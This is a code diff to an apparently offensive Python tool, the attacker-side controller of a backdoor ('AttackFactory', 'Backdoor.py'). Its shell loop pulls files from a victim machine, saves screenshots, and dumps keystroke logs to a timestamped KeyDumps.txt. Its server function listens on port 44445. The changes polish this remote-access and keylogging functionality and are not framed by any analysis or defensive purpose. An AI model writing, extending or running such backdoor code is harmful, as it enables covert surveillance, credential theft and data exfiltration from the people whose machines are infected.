@@ -41,6 +41,8 @@ def shell():
 			if result[:3] != '[!]':
 				file = open(command [9:], "wb")
 				file.write(base64.b64decode(result))
+				file.close()
+				print(colored("[+] Downloaded successfully",'green'))
 			else:
 				print(colored(result,'red'))
 
@@ -52,9 +54,6 @@ def shell():
 			except :
 				result = "[!] File Not Found"
 				reliable_send(result)
-			finally:
-				if result[:3] == "[!]":
-					print(colored(result,'green'))			
 				
 		elif command [:10] == "screenshot":
 			screen = open("screenshot d" + str(count) + ".png", "wb")		
@@ -64,16 +63,21 @@ def shell():
 				print(colored(image_decoded,'red'))
 			else:
 				screen.write(image_decoded)
+				screen.close()
+				print(colored("[+] screenshot saved successfully as screenshot d"+str(count)+ ".png ","green"))
 				count += 1
+				
 		
 		elif command[:12] == "keylog_start":
 			continue
 		
 		elif command[:11] == "keylog_dump":
 			result = reliable_recv()
-			save_log = open('KeyLogs.txt','w')
-			save_log.write(result)
+			save_log = open('KeyDumps.txt','w')
+			header = "\n\n------------------------------------"+ str(time.time())+"------------------------------------ \n\n"
+			save_log.write(header + result)
 			save_log.close()
+			print(colored("[+] Saved Logs as KeyDumps.txt","green"))
 
 		else:
 			result = reliable_recv()
@@ -109,7 +113,7 @@ def server():
 	
 	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-	s.bind(('192.168.2.3',44445))
+	s.bind(('192.168.2.4',44445))
 	opt = input(colored('AttackFactory@Download~Backdoor.py(Y/n)~#$ ' ,'yellow'))
 	if opt == "Y" or opt == "y":
 		try:
